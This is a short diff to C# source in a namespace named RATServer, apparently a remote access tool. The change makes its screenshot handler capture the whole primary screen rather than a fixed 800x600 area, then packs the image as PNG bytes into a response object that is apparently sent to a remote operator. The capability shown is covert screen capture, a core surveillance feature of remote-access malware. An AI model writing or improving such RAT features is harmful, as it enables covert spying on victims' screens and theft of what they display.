@@ -5,7 +5,6 @@ using System.Net;
 using System.Windows.Forms;
 using System.ServiceProcess;
 using System.Drawing;
-using System.Drawing.Imaging;
 
 namespace RATServer
 {
@@ -153,14 +152,12 @@ namespace RATServer
             Response r = new Response { Type = "Data" };
             try
             {
-                int width = 800;
-                int height = 600;
+                Screen ps = Screen.PrimaryScreen;
+                int width = ps.Bounds.Width;
+                int height = ps.Bounds.Height;
                 using (Bitmap bitmap = new Bitmap(width, height))
                 {
-                    using (Graphics g = Graphics.FromImage(bitmap))
-                    {
-                        g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
-                    }
+                    using (Graphics g = Graphics.FromImage(bitmap)) g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
                     r.Msg = "screenshot.png";
                     ImageConverter converter = new ImageConverter();
                     r.Data = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
